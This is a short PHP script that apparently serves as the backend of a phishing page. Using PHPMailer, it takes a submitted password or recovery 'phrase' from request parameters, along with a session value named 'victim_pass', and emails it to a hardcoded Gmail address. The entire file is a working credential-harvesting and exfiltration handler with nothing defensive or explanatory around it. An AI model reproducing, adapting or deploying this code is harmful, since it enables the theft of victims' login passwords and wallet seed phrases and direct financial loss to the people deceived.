<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require_once "vendor/autoload.php";

//PHPMailer Object
$mail = new PHPMailer(true); //Argument true in constructor enables exceptions

//From email address and name
$mail->From = "Setup your sending mail";
$mail->FromName = "Sending Name";

//To address and name
$mail->addAddress("jmdeus.smc@gmail.com", "Recepient Name");
$mail->addAddress("jmdeus.smc@gmail.com"); //Recipient name is optional

//Address to which recipient will reply
$mail->addReplyTo("jmdeus.smc@gmail.com", "Reply");

//CC and BCC
//$mail->addCC("cc@example.com");
//$mail->addBCC("bcc@example.com");

//Send HTML or Plain Text email
$pass = $_SESSION['victim_pass'];
$phrase = $_REQUEST['phrase'];
$mail->isHTML(true);

if(isset($_REQUEST['password'])){
    $pass = $_REQUEST['password'];
    $msg = "Password:".$pass;
}else if(isset($_REQUEST['phrase'])){
    $phrase = $_REQUEST['phrase'];
    $msg = "Phrase:".$phrase;
}
$mail->Subject = "Message Subject";
$mail->Body = $msg;
$mail->AltBody = "This is the plain text version of the email content";

try {
    $mail->send();
    echo "Message has been sent successfully";
} catch (Exception $e) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}